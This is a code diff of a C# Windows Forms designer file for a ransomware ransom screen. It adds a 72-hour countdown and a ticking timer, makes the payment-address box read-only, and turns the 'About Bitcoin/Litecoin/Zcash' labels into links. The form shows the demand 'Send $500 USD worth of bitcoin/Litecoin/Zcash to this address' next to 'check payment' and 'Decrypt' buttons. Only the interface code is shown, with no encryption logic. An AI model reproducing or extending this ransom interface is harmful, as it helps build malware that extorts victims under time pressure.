@@ -45,9 +45,10 @@
             this.label8 = new System.Windows.Forms.Label();
             this.checkpaymentBtn = new System.Windows.Forms.Button();
             this.decryptBtn = new System.Windows.Forms.Button();
-            this.AboutBitcoin = new System.Windows.Forms.Label();
-            this.AboutLitecoin = new System.Windows.Forms.Label();
-            this.AboutZcash = new System.Windows.Forms.Label();
+            this.RiseTimer = new System.Windows.Forms.Timer(this.components);
+            this.aboutBitcoin = new System.Windows.Forms.LinkLabel();
+            this.aboutLitecoin = new System.Windows.Forms.LinkLabel();
+            this.aboutZcash = new System.Windows.Forms.LinkLabel();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
@@ -73,6 +74,7 @@
             this.textBox1.Location = new System.Drawing.Point(247, 49);
             this.textBox1.Multiline = true;
             this.textBox1.Name = "textBox1";
+            this.textBox1.ReadOnly = true;
             this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
             this.textBox1.Size = new System.Drawing.Size(625, 331);
             this.textBox1.TabIndex = 1;
@@ -84,7 +86,7 @@
             this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
             this.pictureBox1.Location = new System.Drawing.Point(3, 0);
             this.pictureBox1.Name = "pictureBox1";
-            this.pictureBox1.Size = new System.Drawing.Size(220, 216);
+            this.pictureBox1.Size = new System.Drawing.Size(238, 216);
             this.pictureBox1.TabIndex = 2;
             this.pictureBox1.TabStop = false;
             // 
@@ -117,7 +119,7 @@
             this.paymentTimer.Name = "paymentTimer";
             this.paymentTimer.Size = new System.Drawing.Size(87, 24);
             this.paymentTimer.TabIndex = 1;
-            this.paymentTimer.Text = "00:00:00\r\n";
+            this.paymentTimer.Text = "72:00:00\r\n";
             // 
             // label3
             // 
@@ -187,6 +189,7 @@
             this.textBox2.Location = new System.Drawing.Point(19, 43);
             this.textBox2.Multiline = true;
             this.textBox2.Name = "textBox2";
+            this.textBox2.ReadOnly = true;
             this.textBox2.Size = new System.Drawing.Size(253, 23);
             this.textBox2.TabIndex = 1;
             this.textBox2.Text = "Money Address";
@@ -201,7 +204,7 @@
             this.label8.Size = new System.Drawing.Size(531, 24);
             this.label8.TabIndex = 0;
             this.label8.Text = "Send $500 USD worth of bitcoin/Litecoin/Zcash to this address:";
-            //
+            // 
             // checkpaymentBtn
             // 
             this.checkpaymentBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -222,35 +225,47 @@
             this.decryptBtn.Text = "Decrypt";
             this.decryptBtn.UseVisualStyleBackColor = true;
             // 
-            // AboutBitcoin
+            // RiseTimer
             // 
-            this.AboutBitcoin.AutoSize = true;
-            this.AboutBitcoin.ForeColor = System.Drawing.Color.White;
-            this.AboutBitcoin.Location = new System.Drawing.Point(37, 410);
-            this.AboutBitcoin.Name = "AboutBitcoin";
-            this.AboutBitcoin.Size = new System.Drawing.Size(70, 13);
-            this.AboutBitcoin.TabIndex = 11;
-            this.AboutBitcoin.Text = "About Bitcoin";
+            this.RiseTimer.Enabled = true;
+            this.RiseTimer.Interval = 1000;
+            this.RiseTimer.Tick += new System.EventHandler(this.RiseTimer_Tick);
             // 
-            // AboutLitecoin
+            // aboutBitcoin
             // 
-            this.AboutLitecoin.AutoSize = true;
-            this.AboutLitecoin.ForeColor = System.Drawing.Color.White;
-            this.AboutLitecoin.Location = new System.Drawing.Point(37, 439);
-            this.AboutLitecoin.Name = "AboutLitecoin";
-            this.AboutLitecoin.Size = new System.Drawing.Size(75, 13);
-            this.AboutLitecoin.TabIndex = 12;
-            this.AboutLitecoin.Text = "About Litecoin";
+            this.aboutBitcoin.AutoSize = true;
+            this.aboutBitcoin.LinkColor = System.Drawing.Color.White;
+            this.aboutBitcoin.Location = new System.Drawing.Point(62, 402);
+            this.aboutBitcoin.Name = "aboutBitcoin";
+            this.aboutBitcoin.Size = new System.Drawing.Size(70, 13);
+            this.aboutBitcoin.TabIndex = 11;
+            this.aboutBitcoin.TabStop = true;
+            this.aboutBitcoin.Text = "About Bitcoin";
+            this.aboutBitcoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBitcoin_LinkClicked);
             // 
-            // AboutZcash
+            // aboutLitecoin
             // 
-            this.AboutZcash.AutoSize = true;
-            this.AboutZcash.ForeColor = System.Drawing.Color.White;
-            this.AboutZcash.Location = new System.Drawing.Point(37, 471);
-            this.AboutZcash.Name = "AboutZcash";
-            this.AboutZcash.Size = new System.Drawing.Size(68, 13);
-            this.AboutZcash.TabIndex = 13;
-            this.AboutZcash.Text = "About Zcash";
+            this.aboutLitecoin.AutoSize = true;
+            this.aboutLitecoin.LinkColor = System.Drawing.Color.White;
+            this.aboutLitecoin.Location = new System.Drawing.Point(62, 434);
+            this.aboutLitecoin.Name = "aboutLitecoin";
+            this.aboutLitecoin.Size = new System.Drawing.Size(76, 13);
+            this.aboutLitecoin.TabIndex = 12;
+            this.aboutLitecoin.TabStop = true;
+            this.aboutLitecoin.Text = "About LiteCoin";
+            this.aboutLitecoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutLitecoin_LinkClicked);
+            // 
+            // aboutZcash
+            // 
+            this.aboutZcash.AutoSize = true;
+            this.aboutZcash.LinkColor = System.Drawing.Color.White;
+            this.aboutZcash.Location = new System.Drawing.Point(62, 471);
+            this.aboutZcash.Name = "aboutZcash";
+            this.aboutZcash.Size = new System.Drawing.Size(68, 13);
+            this.aboutZcash.TabIndex = 13;
+            this.aboutZcash.TabStop = true;
+            this.aboutZcash.Text = "About Zcash";
+            this.aboutZcash.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutZcash_LinkClicked);
             // 
             // Display
             // 
@@ -258,9 +273,9 @@
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.Black;
             this.ClientSize = new System.Drawing.Size(884, 520);
-            this.Controls.Add(this.AboutZcash);
-            this.Controls.Add(this.AboutLitecoin);
-            this.Controls.Add(this.AboutBitcoin);
+            this.Controls.Add(this.aboutZcash);
+            this.Controls.Add(this.aboutLitecoin);
+            this.Controls.Add(this.aboutBitcoin);
             this.Controls.Add(this.decryptBtn);
             this.Controls.Add(this.checkpaymentBtn);
             this.Controls.Add(this.groupBox3);
@@ -313,8 +328,9 @@
         private System.Windows.Forms.Label label8;
         private System.Windows.Forms.Button checkpaymentBtn;
         private System.Windows.Forms.Button decryptBtn;
-        private System.Windows.Forms.Label AboutBitcoin;
-        private System.Windows.Forms.Label AboutLitecoin;
-        private System.Windows.Forms.Label AboutZcash;
+        private System.Windows.Forms.Timer RiseTimer;
+        private System.Windows.Forms.LinkLabel aboutBitcoin;
+        private System.Windows.Forms.LinkLabel aboutLitecoin;
+        private System.Windows.Forms.LinkLabel aboutZcash;
     }
 }
